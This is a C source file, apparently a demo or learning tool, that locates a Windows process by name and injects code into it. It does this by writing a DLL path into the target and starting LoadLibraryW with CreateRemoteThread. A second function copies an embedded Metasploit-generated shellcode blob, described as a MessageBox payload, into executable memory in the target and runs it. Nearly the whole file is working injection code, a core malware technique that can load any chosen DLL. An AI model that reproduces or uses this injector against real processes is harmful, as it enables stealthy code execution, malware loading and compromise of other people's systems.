/**
 * @author Tibap
 * Functions to :
 *  - find a process ID within existing processes
 *  - inject a DLL into process
 *  - inject a shellcode (MessageBox generated from MSF) into process
 */

#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>


typedef HMODULE(WINAPI* _loadLib)(LPCTSTR filename);

DWORD FindProcessIdFromName(WCHAR* process_name) {

	wprintf(TEXT("Looking for %s process ID...\n"), process_name);

	HANDLE hSnap;
	PROCESSENTRY32 process_info;
	DWORD explorerId = 0;

	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) {
		wprintf(TEXT("Invalid handle value\n"));
		return 0;
	}

	wprintf(TEXT("Getting process info...\n"));

	// Set size of process entry
	process_info.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hSnap, &process_info)) {
		wprintf(TEXT("Failed to get process info of process.\n"));
		CloseHandle(hSnap);
		return 0;
	}
	do {
		// Print process info and modules info
		wprintf(TEXT("."));
		//wprintf(L"Process name: %s\n", process_info.szExeFile);
		//wprintf(L"  Process ID: %d\n", process_info.th32ProcessID);

		if (wcscmp(process_info.szExeFile, process_name) == 0) {
			explorerId = process_info.th32ProcessID;
			wprintf(TEXT("\nFound %s: %d\n"), process_name, explorerId);
			break;
		}

	} while (Process32Next(hSnap, &process_info));

	if (explorerId == 0) {
		if (GetLastError() != ERROR_NO_MORE_FILES) {
			wprintf(TEXT("Error: %d\n"), GetLastError());
		}
	}
	CloseHandle(hSnap);

	return explorerId;
}

int injectDLL(HANDLE handleToProcess, WCHAR* dll_path) {

	_loadLib loadLibAddr = NULL;
	LPVOID dll_address = NULL;

	// Get LoadLibrary address from module
	// Careful between ANSI vs UNICODE versions
	loadLibAddr = (_loadLib)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "LoadLibraryW");
	//loadLibAddr = (_loadLib)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "LoadLibraryA");

	if (loadLibAddr == NULL) {
		wprintf(TEXT("Error GetProcAddress of LoadLibrary: %d\n"), GetLastError());
		return -1;
	}
	wprintf(TEXT("Address of LoadLibraryW has been identified.\n"));

	// VirtualAlloc
	dll_address = VirtualAllocEx(handleToProcess, NULL, sizeof(WCHAR) * wcslen(dll_path) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	//dll_address = VirtualAllocEx(handleToProcess, NULL, strlen(dll_path), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (dll_address == NULL) {
		wprintf(TEXT("Error VirtualAlloc: %d\n"), GetLastError());
		return -1;
	}
	wprintf(TEXT("VirtualAlloc succeeded: DLL string has been allocated within targeted process.\n"));

	// Write DLL name into memory
	if (WriteProcessMemory(handleToProcess, dll_address, dll_path, sizeof(WCHAR) * wcslen(dll_path) + 1, NULL) == NULL) {
	//if (WriteProcessMemory(handleToProcess, dll_address, dll_path, strlen(dll_path), NULL) == NULL) {
		wprintf(TEXT("Error WriteProcessMemory: %d\n"), GetLastError());
		CloseHandle(dll_address);
		return -1;
	}
	wprintf(TEXT("DLL string name has been written into memory... Now creating remote thread with LoadLibrary!\n"));

	// Create remote thread
	if (CreateRemoteThread(handleToProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibAddr,
		dll_address, NULL, NULL) == NULL) {
		wprintf(TEXT("Error CreateRemoteThread: %d\n"), GetLastError());
		if (GetLastError() == 5) {
			wprintf(TEXT("Checkout that you want to inject into the same address space: 32bits -> 32 bits...\n"));
		}
	}
	CloseHandle(dll_address);
	return 0;
}


int injectShellcode(HANDLE handleToProcess) {
	unsigned char shellcode[] =
		"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
		"\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
		"\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
		"\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
		"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
		"\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
		"\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
		"\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
		"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
		"\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
		"\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
		"\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
		"\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
		"\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67"
		"\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3"
		"\x68\x58\x20\x20\x20\x68\x4d\x53\x46\x21\x68\x72\x6f\x6d\x20"
		"\x68\x6f\x2c\x20\x66\x68\x48\x65\x6c\x6c\x31\xc9\x88\x4c\x24"
		"\x10\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff"
		"\x55\x08";
	unsigned int sizeofshellcode = sizeof(shellcode);
	wprintf(TEXT("Size = %Iu\n"), sizeofshellcode);

	LPVOID shellcode_addr = NULL;
	shellcode_addr = VirtualAllocEx(handleToProcess, NULL, sizeofshellcode, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (shellcode_addr == NULL) {
		wprintf(TEXT("Error VirtualAlloc: %d\n"), GetLastError());
		return -1;
	}
	wprintf(TEXT("VirtualAlloc succeeded: shellcode has been allocated within targeted process.\n"));

	if (WriteProcessMemory(handleToProcess, shellcode_addr, shellcode, sizeofshellcode, NULL) == NULL) {
		wprintf(TEXT("Error WriteProcessMemory: %d\n"), GetLastError());
		return -1;
	}
	wprintf(TEXT("Shellcode has been written into memory... Now creating remote thread to start our shellcode!\n"));
	if (CreateRemoteThreadEx(handleToProcess, NULL, 0, (LPTHREAD_START_ROUTINE)shellcode_addr,
		0, NULL, NULL, NULL) == NULL) {
		wprintf(TEXT("Error CreateRemoteThread: %d\n"), GetLastError());
		if (GetLastError() == 5) {
			wprintf(TEXT("Checkout that you want to inject into the same address space: 32bits -> 32 bits...\n"));
		}
		return -1;
	}
	return 0;
}


int wmain(int argc, WCHAR* argv[]) {
	HANDLE handleToProcess;
	DWORD processId = 0;

	if (argc != 3) {
		wprintf(TEXT("Wrong number of arguments, specify process to check.\n"));
		wprintf(TEXT("Usage: %s process_to_inject DLL_to_inject\n"), argv[0]);
		return -1;
	}

	WCHAR* process_name = argv[1];
	WCHAR* dll_path = argv[2];

	//Check if DLL exists
	if (INVALID_FILE_ATTRIBUTES == GetFileAttributes(dll_path) && GetLastError() == ERROR_FILE_NOT_FOUND) {
		wprintf(TEXT("Path %s does not exist.\n"), dll_path);
		return -1;
	}

	processId = FindProcessIdFromName(process_name);
	if (processId == 0) {
		wprintf(TEXT("\nCannot find process, quitting.\n"));
		return -1;
	}
	handleToProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
	if (handleToProcess == NULL) {
		wprintf(TEXT("Cannot open handle to remote process, quitting.\n"));
		return -1;
	}
	wprintf(TEXT("Handle has been opened to process.\n"));

	// Chose what to do here: inject DLL, inject shellcode or inject DLL to hook API.
	injectDLL(handleToProcess, dll_path);
	//injectShellcode(handleToProcess);
	system("pause");

	CloseHandle(handleToProcess);

	return 0;
}
